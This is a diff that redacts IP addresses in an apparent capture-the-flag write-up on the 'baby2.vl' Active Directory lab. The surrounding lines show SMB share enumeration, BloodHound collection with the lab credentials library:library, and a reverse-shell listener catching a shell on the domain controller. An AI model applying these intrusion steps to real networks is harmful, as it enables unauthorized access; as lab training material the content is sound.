@@ -213,7 +213,7 @@ IPC$            READ            Remote IPC
 NETLOGON        READ            Logon server share 
 SYSVOL                          Logon server share 
 
-[+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.234.72.json".
+[+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.xx.xx.json".
 [*] SMB Shares:           8 (ADMIN$, apps, C$, docs, homes, IPC$, NETLOGON, SYSVOL)
 [*] SMB Readable Shares:  4 (apps, homes, IPC$, NETLOGON)
 [*] SMB Writable Shares:  1 (homes)
@@ -535,7 +535,7 @@ Using a low-priv account to collect BloodHound edges is usually enough to reveal
 [+] baby2.vl\library:library 
 Resolved collection methods: dcom, trusts, session, psremote, container, acl, rdp, group, localadmin, objectprops
 Done in 0M 8S
-Compressing output into /home/kali/.nxc/logs/DC_10.129.234.72_2025-10-03_213417_bloodhound.zip
+Compressing output into /home/kali/.nxc/logs/DC_10.129.xx.xx_2025-10-03_213417_bloodhound.zip
 ```
 
 I ingest the zip into BloodHound-CE and mark compromised users. 
@@ -622,7 +622,7 @@ MapNetworkShare "\\dc.baby2.vl\docs", "L"
 Listener:
 ```bash
 ❯ penelope
-[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.226.139 • 172.17.0.1 • 10.10.14.148 • 172.18.0.1
+[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.226.139 • 172.17.0.1 • 10.10.xx.xx • 172.18.0.1
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
 
@@ -630,12 +630,12 @@ Wait a minute or so for a domain user logon event and…
 
 ```text
 ❯ penelope
-[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.226.139 • 172.17.0.1 • 10.10.14.148 • 172.18.0.1
+[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.226.139 • 172.17.0.1 • 10.10.xx.xx • 172.18.0.1
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-[+] Got reverse shell from DC~10.129.234.72-Microsoft_Windows_Server_2022_Standard-x64-based_PC 😍️ Assigned SessionID <1>
+[+] Got reverse shell from DC~10.129.xx.xx-Microsoft_Windows_Server_2022_Standard-x64-based_PC 😍️ Assigned SessionID <1>
 [+] Added readline support...
 [+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
-[+] Logging to /home/kali/.penelope/sessions/DC~10.129.234.72-Microsoft_Windows_Server_2022_Standard-x64-based_PC/2025_10_03-22_02_03-363.log 📜
+[+] Logging to /home/kali/.penelope/sessions/DC~10.129.xx.xx-Microsoft_Windows_Server_2022_Standard-x64-based_PC/2025_10_03-22_02_03-363.log 📜
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 PS C:\Windows\system32> whoami
 baby2\amelia.griffiths
